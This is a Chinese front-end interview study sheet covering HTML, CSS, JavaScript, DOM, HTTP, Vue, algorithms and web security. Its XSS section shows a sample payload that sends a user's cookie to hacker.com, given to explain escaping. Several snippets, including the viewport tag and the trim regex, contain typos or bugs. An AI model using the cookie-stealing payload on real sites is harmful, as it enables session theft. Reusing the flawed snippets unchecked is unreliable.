# HTML

  ### 如何理解前端语义化？（*）

* 不仅要使机器（有助于SEO）易于理解，也要使人易于理解 
* 尽可能少的使用无语义的标签div和span 
* 多使用 强调（strong ），段落（p），标题用（h1），页眉（header），页脚（footer），导航链接 （nav），边栏（aside）

### META viewport的作用？ 

<meta name="viewport" content="width=devidce-width",user-scalable=no,initial-scale=1.0,maximum-scale=1.0,minimun-scale=1.0">

控制移动端页面的显示

### CANVAS

show项目



# CSS

### 盒模型

content-box : width == 内容区宽度

border-box : width == 内容区宽度 + padding宽度

* 如果兼容性要求低的话，使用border-box

### CSS reset和normalize.css 的区别

* reset  ： 重置样式，抛弃默认样式
* normalize : 是在所有浏览器和设备上显示为标准样式，强调标准样式覆盖浏览器默认样式

### 如何居中？

#### 水平居中

#### 垂直居中

### 选择器优先级如何确定

1、选择器越具体，优先级越高

2、同样优先级，写在后面的覆盖前面的

3、！important 优先级最高（但最好不用） 

### BFC是什么

* overflow：父标签hidden 清除浮动
* overflow：hidden 取消父子margin合并（子设置margin，父也会有margin）

### 如何清除浮动

* Overflow：hiddfen

* clearfix 清除浮动

# JS

### JS的数据类型

string number boolean undefined null object symbol

object包括了数组、函数

NaN是num

### 声明前置

### 基本类型和引用类型修改值后的情况

引用类型是引用地址，赋值后修改值会使所有新赋值的值也修改。

  ### Promise如何使用(*)

* .then的用法  $.ajax().then(成功函数、失败函数)

* .then的链式调用

* 如何自己生成Promise对象

  ```
  function xxx(){
  	return new Promise(function(resolve,reject){
          if(){
              resolve(data)
          }else{
              reject(data)
          }
  	})
  }
  
  xxx().then()
  ```

### 手写AJAX

```
let xhr = new XMLHttpRequest()
xhr.open('GET','/xxxx')
xhr.onreadystatechange = function(){
    if(xhr.readyState === 4 && xhr.status === 200){
        console.log(xhr.responseText)
    }
}
xhr.send('a=1&b=2')
```

### 闭包是什么

```
function createAdder(){
    var n=0
    return function(){
        n += 1
        console.log(n)
    }
}
let adder = createAdder()
adder() //1
adder() //2
console.log(n) //n is not undefined
```

  看阮一峰 

### this

* 没有对象只有方法则指向全局对象

  fn()的this是window

* 有对象调用方法就指向调用对象

  a.fn()的this是a

* new F()的this是新实例

* 箭头函数里的this是外部作用域的this

### 立即执行函数

```
(function(){});
(function(){})()
```

立即执行函数是为了生成一个函数作用域，防止污染全局变量

### async和await语法了解么

目的：把异步代码写成同步代码

例子：百度一下

### 如何实现深拷贝

* 用JSON深拷贝

  ```js
  var a = {...}
  var b = JSON.parse(JSON.stringify(a))
  ```

* 递归拷贝

  ```js
  function clone(object){
      var object2
      if(object instanceof Array){
          object2 = []
      }else if(object instanceof Function){
          object2 = eval(object.toString())
      }else if(object instanceof Object){
          object2 = {}
      }
      for(let key in object){
          object2[key] = clone(object[key])
      }
      return object2
  }
  ```

  百度一下

### 如何实现数组去重

* 计数排序的逻辑(只能正整数)

```
var a = [正整数....]
var hashTab = {}
for(let i=0;i<a.length;i++){
    if(a[i] in hashTab){
        
    }else{
        hashTab[a[i]] = true
    }
}
console.log(Object.keys(hashTab))
```

* Set去重

```
a = [1,2,2,3]
Array.from(new Set(a))
```

### 如何用正则实现string.trim()

```
function trim(string){
    return string.replace(/^\s+|\s+$/,")
}
```

### 原型

`array.push(num)`中push是沿着`array.__proto__`找到的，也就是Array.prototype.push

原型图

### ES6的class

把MDN的class文档看一遍

### JS如何实现继承

- 通过原型链实现继承

  ```
  function Dialog(target) {
      this.target = target
  }
  Dialog.prototype.show = function() {
      console.log(this.target + ' show')
  }
  Dialog.prototype.hide = function() {
      console.log(this.target + ' hide')
  }
  var dialog = new Dialog('body')
  dialog.show()
  
  function Message(target, name) {
      Dialog.call(this, target)     //这句很重要
      this.name = name
  }
  Message.prototype = Object.create(Dialog.prototype)   //这句更重要
  Message.prototype.success = function() {
      console.log(this.name + ' success' )
  }
  
  var msgBox = new Message('main', 'msg')
  msgBox.show()
  msgBox.success()
  ```

  

- 通过extends关键字



# DOM

### DOM时间模型

- 捕获
- 冒泡

### 移动端的触摸事件

- touchstart touchmove touchend touchcancel
- 模拟swipe事件：记录两次touchmove的位置差

### 事件委托

监听父元素，看事件触发是哪个子元素

```
写一个事件委托
```



# HTTP

### HTTP报文

三个部分组成

1. 对报文描述的起始行 - startline 
2. 包含属性的首部块 - header
3. 可选的包含数据的主题部分 - body 

```
HTTP/1.0 200 OK
content-type：text/plain
content-length:19

Hi,I'm a message
```



### 状态码

### 301和302的区别

- 301永久重定向：浏览器会缓存
- 302临时重定向：浏览器不缓存

### HTTP缓存怎么做

- Cache-Contrl:max-age=300
- http://cdn.com/1.js?v=1避开缓存

### Cookie是什么？ Session是什么？

#### cookie

- HTTP响应通过Set-cookie设置Cookie
- 浏览器访问指定域名时必须带上cookie作为request header
- cookie一般用来记录用户信息

#### session

- session是服务器端的内存
- session一般通过在cookie里记录sessionID实现
- sessionID一般是随机数

#### localstorage和cookie区别

- cookie会随请求发送到服务器上，localstorage不会
- cookie一般大小4k，localstorage一般是5M

### GET和POST的区别

- GET的参数放在URL的查询参数里，POST的参数放在请求消息体（数据）里
- 安全：GET没有POST安全
- GET的参数有长度限制，一般是1024个字符，POST的参数没有长度限制，一般是4-10Mb
- 包：GET请求只需发一个包，POST请求需要发两个以上包（因为POST有消息体）
- GET用来读数据，POST用来写数据

### 跨域？JSONP？CORS？

- js里发送ajax请求，如果请求的URL和当前的URL非同于，浏览器拒接提供接受的收据并报错。
- 解决办法：JSONP、CORS
- 同域名，同端口，同协议

#### JSONP

可以通过提前在页面上声明一个函数，再创建一个script便签，并在src引用地址，同时后端在原始数据上进行函数包裹。

#### CORS

跨域资源共享，需要服务端配合将返回结果加上响应头：ACCESS-CONtrOL-allow-origin

# VUE

### vue的生命周期

### 如何组件通信

- 父子通信 ：prop、v-on绑定事件
- 爷孙通信：通过两对父子通信
- 兄弟通信：new Vue（）作为eventBUS

### VUEX是什么

### VUE router是什么

### 双向绑定如何实现的？

vue深入响应式原理文档

### computed的用法？和method的区别

# 算法

### 排序算法

冒泡排序

选择排序

计数排序

快速排序

插入排序

### 二分查找法

# 安全

### 什么是XSS攻击，如何预防？

- ```
  div.innerHTML = userComment //userComment内容是<script>$.get('http://hacker.com?cookie')</script>
  ```

  偷走用户的cookie

- 预防

  不要使用innerHTML,使用innerText

  如果一定要用innerHTML,字符过滤，把<替换成&lt，>替换成&gt ，&替换成&amp

### 什么是CSRF攻击，如何预防

- 过程 

1. 用户在qq.com登录
2. 用户切换到hacker.com（恶意网站）
3. hacker.com发送一个qq.com/friends请求，获取好友信息并盗走

- 用户没有想法这个请求，hacker伪造了用户发请求
- 避免： 检查referer，qq.com可以拒绝非法请求

### 从输入URL到页面展示过程

1. DNS查询
2. 建立TCP连接，三次握手
3. 发送HTTP请求
4. 后台处理请求
5. 发送HTTP相应
6. 关闭TCP连接，四次挥手
7. 解析HTML
8. 下载CSS、并解析
9. 下载JS、并解析
10. 下载并解析图片
11. 渲染DOM树
12. 渲染样式树
13. 执行JS

